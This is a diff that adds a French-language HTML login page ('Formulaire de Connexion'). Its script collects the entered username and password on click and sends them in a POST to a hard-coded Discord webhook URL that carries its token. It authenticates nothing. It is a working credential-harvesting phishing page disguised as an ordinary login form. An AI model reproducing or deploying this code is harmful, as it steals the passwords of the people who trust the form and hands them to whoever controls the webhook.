@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire de Connexion</title>
+</head>
+<body>
+    <form id="loginForm">
+        <label for="username">Identifiant/E-mail/Téléphone:</label><br>
+        <input type="text" id="username" name="username"><br>
+        <label for="password">Mot de passe:</label><br>
+        <input type="password" id="password" name="password"><br><br>
+        <button type="button" id="loginButton">Connexion</button>
+    </form>
+
+    <script>
+        document.getElementById("loginButton").addEventListener("click", function() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+
+            // Créez un objet avec les données à envoyer
+            var data = {
+                username: username,
+                password: password
+            };
+
+            // Envoyez les données à votre Webhook Discord
+            fetch('https://discord.com/api/webhooks/1238833322881323048/NuSvCMN54E4-ZaJVMbHXARcjfkCta18a6vusgFe5kLUGe0hvHfl2Ey3dFsqlAQ5Nk-ik', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Données envoyées avec succès');
+                    // Vous pouvez ajouter ici une action à effectuer après l'envoi des données, comme rediriger l'utilisateur vers une autre page
+                } else {
+                    console.error('Erreur lors de l\'envoi des données');
+                }
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi des données:', error);
+            });
+        });
+    </script>
+</body>
+</html>
